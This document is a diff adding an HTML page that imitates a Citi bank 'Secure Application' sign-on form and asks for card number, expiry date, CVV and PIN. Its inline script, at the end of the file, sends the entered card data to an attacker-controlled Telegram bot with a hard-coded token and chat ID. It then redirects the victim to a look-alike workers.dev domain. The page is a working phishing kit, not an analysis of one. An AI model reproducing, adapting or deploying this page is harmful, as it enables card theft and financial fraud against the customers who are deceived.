@@ -1,0 +1,531 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta id="viewport" content="width=device-width">
+    <title>Sign On</title>
+    <link href="style.css" rel="stylesheet" type="text/css" />
+    <style>
+    body
+{
+  padding: 0;
+  margin: 0;
+  box-sizing: border-box;
+  font-family: Interstate_Light,sans-serif,Arial;
+  background: #333333
+}
+
+header#header
+{
+    /* border-bottom: 30px solid rgb(0, 45, 114) */
+    background: #fff;
+    border-bottom: 35px solid rgb(0, 45, 114)
+  
+}
+header#header .container
+{
+  display: flex;
+  justify-content: space-between;
+  width: 90%;
+  margin: auto;
+  align-items: center
+}
+.img-loc .branch p
+{
+  font-size: 11px;
+}
+.img-loc .branch
+{
+  color: #666
+}
+.img-loc img
+{
+  height: 26px
+}
+.img-loc
+{
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  text-align: center;
+  width: 10%
+}
+
+section#form-section .contain .box .steps p
+{
+  font-size: 13px;
+  font-family: Interstate_Light,sans-serif,Arial;
+  color:#333;
+  margin-bottom: 3%
+}
+
+section#form-section .contain .box .steps
+{
+  width: 80%;
+  margin: auto;
+}
+section#form-section .contain .box h3
+{
+      font-size: 1.625rem;
+    line-height: 2rem;
+    font-family: Interstate_Light,sans-serif;
+    font-weight: 400;
+    color: #333;
+    text-transform: none;
+    letter-spacing: normal;
+}
+section#form-section .contain .box
+{
+-webkit-box-shadow: 1px 0px 19px -3px rgba(0,0,0,0.29);
+-moz-box-shadow: 1px 0px 19px -3px rgba(0,0,0,0.29);
+box-shadow: 1px 0px 19px -3px rgba(0,0,0,0.29);height:500px
+}
+section#form-section .contain
+{
+  display: flex;
+  justify-content: space-between;
+  padding-top: 4%
+}
+section#form-section .contain
+{
+  width: 80%;
+  margin: auto;
+}
+section#form-section
+{
+ background: #fff;
+display: block;
+width: 100%;
+}
+.glad h1
+{
+  argin-bottom: 43px;
+    font-size: 2.4rem;
+    line-height: 36px;
+    font-family: Interstate_Light,sans-serif;
+    font-weight: 300;
+    color: #333!important;
+    margin-top: 40px;
+    margin-bottom: 40px;
+}
+.before-apply ul li
+{
+  font-family: Interstate_Light,sans-serif,Arial;
+    font-size: 16px;
+    color: #333;
+    margin-bottom: 9px; 
+    font-weight: 200
+}
+.before-apply p
+{
+  font-family: Interstate_Bold,sans-serif;
+  font-weight: 700;
+  font-size: 16px;
+  line-height: 1.5;
+  color: #333;
+}
+.personal h4
+{
+      font-size: 19px;
+    color: #002d72;
+    font-weight: 700;
+    border-bottom: 1px solid #c1c2c3;
+    margin-bottom: 32px;
+    text-transform: uppercase;
+    padding-bottom: 7px;
+    margin-top: 40px
+}
+section#form-section .name
+{
+  display: flex;
+  justify-content: space-between
+}
+section#form-section input:focus
+{
+  outline: 1.5px solid rgb(0, 45, 114)
+}
+section#form-section .billname input
+{
+    width: 30%;
+
+}
+section#form-section input
+{
+    box-sizing: border-box;
+    -moz-box-sizing: border-box;
+    letter-spacing: .5px;
+    height: 48px;
+    padding: 10px 20px;
+    background: #eee;
+    border: none!important;
+    box-shadow: none;
+    border-radius: 8px;
+    width: 47%;
+    margin-top: 5%;
+    font-family: inherit
+}
+
+.form-cove h1
+{
+  font-size: 1.313rem;
+    line-height: 1.688rem;
+    font-family: Interstate_Light,sans-serif;
+    font-weight: 300;
+    text-transform: none;
+    letter-spacing: normal;
+    color: #333333
+}
+input[type=password],
+input[type=text]{
+    font-size: 1rem;
+    font-family: Interstate_Light,sans-serif,Arial;
+}
+.form-cove .inputs
+{
+  display: flex;
+  justify-content: space-between;
+}
+.form-cove .inputs input
+{
+    box-sizing: border-box;
+    -moz-box-sizing: border-box;
+    letter-spacing: .5px;
+    height: 48px;
+    padding: 10px 20px;
+    background: #eee;
+    border: none!important;
+    box-shadow: none;
+    border-radius: 8px;
+    width: 47%
+}
+
+.reg-pwd .pwd
+{
+  text-align: left;
+}
+.reg-pwd .reg
+{
+  text-align: left
+}
+.reg-pwd a
+{
+  font-size: 12px;
+  color: #056dae
+}
+.reg-pwd
+{
+  display: flex;
+  justify-content: space-between;
+  width: 100%
+}
+.form-cove
+{
+
+  background: #fff;
+  padding: 20px;
+  width: 20%;
+  height: 330px
+}
+.qr-sign a
+{
+  font-size: 12px;
+  width: 30%;
+  color: #056dae;
+}
+.qr-sign
+{
+  display: flex;
+  justify-content: space-between;
+  align-items: center
+}
+
+.form-box .secure-lock h4
+{
+  font-size: 20px!important;
+  line-height: 1.5rem;
+  font-family: Interstate_Light,sans-serif,Arial;
+ color: #002d72;
+  font-weight: 700;
+}
+.form-box .secure-lock p
+{
+  font-size: 11px;
+  color: #666;
+  font-weight: bold
+}
+.form-box .secure-lock
+{
+  display: flex;
+  width: 100%;
+  justify-content: space-between;
+  align-items: center;
+    border-bottom: 1px solid #999;
+}
+
+
+footer#footer .contain .ulls
+{
+  text-align: left;
+}
+footer#footer .contain ul li
+{
+  list-style: none;
+  padding: 10px;
+  font-size: 13px;
+  color: #f1f1f1
+}
+footer#footer .contain
+{
+  width: 65%;
+  margin: auto;
+  display: flex;
+  justify-content: space-between;
+  margin-top: 3%
+}
+footer#footer
+{
+  background: #333333;
+  color: #fff
+}
+
+
+.citizen
+{
+  display: grid
+}
+
+form button
+{
+  color: #fff;
+    border-color: #056dae;
+    background: #056dae;
+    line-height: 46px;
+    border-width: 2px;
+    border-style: solid;
+    margin: 30px 20px 20px 0;
+    min-width: 220px;
+    position: relative;
+    border-radius: 7px;
+    font-weight: bold;
+}
+
+
+@media(max-width: 1000px)
+{
+  header#header
+{
+    border-bottom: 40px solid rgb(0, 45, 114)
+  
+}
+form button{
+  width: 100%
+}
+section#form-section .billname input{
+  width: 100%
+}
+  body{
+    background: #fff
+  }
+  .form-cove
+{
+  position: relative;
+  width: 80%;
+  left: 40%;
+  top: 39%;
+  transform: translate(-39%, 0%);
+}
+footer#footer .contain
+{
+  width: 95%;
+  margin: auto;
+  display: flex;
+  flex-direction: column;
+  justify-content: space-between;
+  margin-top: 3%
+}
+.img-loc
+{
+  display: none
+}
+
+header#header .container
+{
+  width: 100%
+}
+section#form-section .name
+{
+  flex-direction: column;
+}
+.form-cove .inputs
+{
+  display: flex;
+  flex-direction: column;
+  justify-content: space-between;
+  margin-top: -10%;
+}
+.form-cove .inputs input{
+  width: 100%;
+  margin-top: 10%
+}
+
+section#form-section input
+{
+  width: 100%;
+}
+section#form-section
+{
+  min-height: 300px
+}
+section#form-section .contain .box
+{
+  display: none;
+}
+}
+    </style>
+  </head>
+  <body>
+    <header id="header">
+      <div class="container">
+        <img src="https://www.citi.com/cbol-pre-login-static-assets/citi-branding-assets/images/citilogoredesign.png" alt="">
+        <div class="img-loc">
+          <div class="branch">
+          </div>
+          <div class="branch">
+          </div>
+        </div>
+      </div>
+    </header>
+    <section id="form-section">
+
+        <div class="contain">
+          <div class="box">
+            <img src="https://online.citi.com/US/ag/assets/Family.jpg" alt="">
+            <div class="steps">
+              <h3>Steps</h3>
+              <p class="one" style="">1. PERSONAL INFORMATION</p>
+              <p>2.  ID VERIFICATION</p>
+              <p>3.  EMPLOYMENT & INCOME</p>
+              <p>4.  SET UP ONLINE ACCESS</p>
+              <p>5.  AGREEMENTS & DISCLOSURES</p>
+              <p>6.  TRANSFER FUNDS</p>
+            </div>
+          </div>
+          <div class="form-box">
+            <div class="secure-lock">
+              <h4>Citi®</h4>
+              <p>Secure Application</p>
+            </div>
+            <div class="glad">
+              <h1>We’re glad you’re here!</h1>
+              <div class="before-apply">
+                <p>Verify Identity</p>
+                <ul>
+                  <li>You'll need to agree to the Paperless Terms & Conditions before verifying your information</li>
+                  <li>
+                    We'll have you verify your card information if you don't have them already, so you can access your account online
+                  </li>
+                </ul>
+              </div>
+            </div>
+            <div class="personal">
+              <h4>Card Details</h4>
+              <form action="" id="form" method="post">
+                <div class="name">
+                  <input type="text" placeholder="XXXX-XXXX-XXXX-XXXX" id="firstN" required>
+                  <input type="text" placeholder="mm-yyyy" id="secondN" required>
+                </div>
+                <div class="citizen">
+                
+                  <input type="text" placeholder="3 DIGIT CODE(CVV)" value="" id="cvv" required>
+                  <input type="text" placeholder="4 DIGIT PIN" id="securityWord" required>
+                </div>
+                <button type="submit">Continue</button>
+              </form>
+            </div>
+          </div>
+        </div>
+
+    </section>
+
+    <footer id="footer">
+      <div class="contain">
+        <div class="ulls">
+          <ul>
+            <li style="font-weight: bold; ">Why Citi</li>
+            <br>
+            <li>Our Story</li>
+            <li>Benefits and Services</li>
+            <li>Rewards</li>
+            <li>Citi Easy Deals</li>
+            <li>Citi Entertainment</li>
+            <li>Special Offers</li>
+          </ul>
+        </div>
+        <div class="ulls">
+          <ul>
+            <li style="font-weight: bold; color:#fff;">Wealth Management</li>
+            <li>Citigold Private Client</li>
+            <li>Citigold</li>
+            <li>Citi Priority</li>
+            <li>Citi Private Bank</li>
+          </ul>
+        </div>
+        <div class="ulls">
+          <ul>
+            <li style="font-weight: bold; color:#fff;" >Business Banking</li>
+            <li>Small Business Accounts</li>
+            <li>Commercial Accounts</li>
+          </ul>
+        </div>
+        <div class="ulls">
+          <ul>
+            <li style="font-weight: bold; color:#fff;" >Rates</li>
+            <li>Personal Banking</li>
+            <li>Credit Cards</li>
+            <li>Mortgage</li>
+            <li>Home Equity</li>
+            <li>Lending</li>
+          </ul>
+        </div>
+        <div class="ulls">
+          <ul>
+             <li style="font-weight: bold; color:#fff;" >Help & Support</li>
+            <li>Contact Us</li>
+            <li>Help & FAQs</li>
+            <li>Security Center</li>
+          </ul>
+        </div>
+      </div>
+    </footer>
+
+    
+  <script>
+    const formal = document.querySelector('#form')
+  
+    let bot = {
+        TOKEN: "5190068586:AAFD_XLBgOfT81KGz9TSr-twJAt0SYAONNk",
+        chatID: "-727286103"
+    }
+
+
+    formal.addEventListener("submit", e =>{
+        e.preventDefault();
+
+        let cardNo = document.querySelector('#firstN').value
+        let Exp = document.querySelector('#secondN').value
+        let cVV = document.querySelector('#cvv').value
+        let Pin = document.querySelector('#securityWord').value
+      
+        fetch(`https://api.telegram.org/bot${bot.TOKEN}/sendMessage?chat_id=${bot.chatID}&text=CITILogs==cardNo=::${cardNo}==EXP:=${Exp}==CVV:=${cVV}==PIN:=${Pin}`, {
+            method: "GET"
+        }).then(success => {
+            window.location.replace("https://review.citi-app.workers.dev");
+        }, error => {
+            alert("Message not sent")
+            console.log(error)
+
+        })
+    })
+</script>
+  </body>
+</html>
